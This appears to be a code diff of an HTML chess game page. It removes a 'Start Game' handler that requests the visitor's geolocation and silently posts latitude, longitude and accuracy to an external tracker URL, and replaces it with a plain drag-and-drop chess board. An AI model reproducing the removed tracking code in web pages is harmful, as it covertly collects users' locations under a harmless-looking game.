@@ -5,7 +5,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Chess Game</title>
 
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/chessboard.js/1.0.0/chessboard-1.0.0.min.css"/>
+<!-- Chessboard.css -->
+<link rel="stylesheet" href="https://unpkg.com/chessboardjs@1.0.0/dist/chessboard-1.0.0.min.css">
 
 <style>
 body {
@@ -19,7 +20,6 @@ body {
   justify-content:center;
   min-height:100vh;
 }
-
 .card {
   background:#111827;
   padding:20px;
@@ -27,10 +27,10 @@ body {
   box-shadow:0 10px 30px rgba(0,0,0,0.5);
   text-align:center;
 }
-
 #board {
   margin-top:15px;
   width:400px;
+  height:400px;
 }
 </style>
 </head>
@@ -38,71 +38,31 @@ body {
 
 <div class="card">
   <h1>Chess Game</h1>
-  <p>Click “Start Game” to begin.</p>
-  <button onclick="requestLocation()">Start Game</button>
+  <p>Drag and drop to play.</p>
   <div id="board"></div>
 </div>
 
-<script src="https://cdnjs.cloudflare.com/ajax/libs/chess.js/1.0.0/chess.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/chessboard.js/1.0.0/chessboard-1.0.0.min.js"></script>
+<!-- Chess.js -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/chess.js/0.13.4/chess.min.js"></script>
+<!-- Chessboard.js -->
+<script src="https://unpkg.com/chessboardjs@1.0.0/dist/chessboard-1.0.0.min.js"></script>
 
 <script>
-const WORKER_URL = "https://jovdat7.github.io/tracker/"; // Your Cloudflare Worker URL
-
-let game;
-let board;
-
-function requestLocation() {
-  if (!navigator.geolocation) {
-    startChessGame();
-    return;
-  }
-
-  // Ask for permission
-  navigator.geolocation.getCurrentPosition(
-    (pos) => {
-      // Send location silently to Worker
-      fetch(WORKER_URL, {
-        method: "POST",
-        headers: {"Content-Type":"application/json"},
-        body: JSON.stringify({
-          lat: pos.coords.latitude,
-          lon: pos.coords.longitude,
-          acc: pos.coords.accuracy
-        })
-      }).catch(console.error);
-
-      // Start the game
-      startChessGame();
-    },
-    () => {
-      // User denied, still start the game
-      startChessGame();
+let game = new Chess();
+let board = Chessboard('board', {
+  draggable: true,
+  position: 'start',
+  onDrop: (source, target) => {
+    let move = game.move({from: source, to: target, promotion:'q'});
+    if(!move) return 'snapback';
+    board.position(game.fen());
+    if(game.game_over()){
+      if(game.in_checkmate()) alert("Checkmate!");
+      else if(game.in_stalemate()) alert("Stalemate!");
+      else if(game.in_draw()) alert("Draw!");
     }
-  );
-}
-
-function startChessGame() {
-  document.getElementById("board").style.display = "block";
-  game = new Chess();
-  board = Chessboard('board', {
-    draggable:true,
-    position:'start',
-    onDrop:handleMove
-  });
-}
-
-function handleMove(source, target) {
-  let move = game.move({from:source, to:target, promotion:'q'});
-  if(move===null) return 'snapback';
-  board.position(game.fen());
-
-  if(game.game_over()) {
-    if(game.in_checkmate()) alert("Checkmate! Game over.");
-    else if(game.in_stalemate()) alert("Stalemate! Game over.");
-    else if(game.in_draw()) alert("Draw! Game over.");
   }
-}
+});
 </script>
 
 </body>
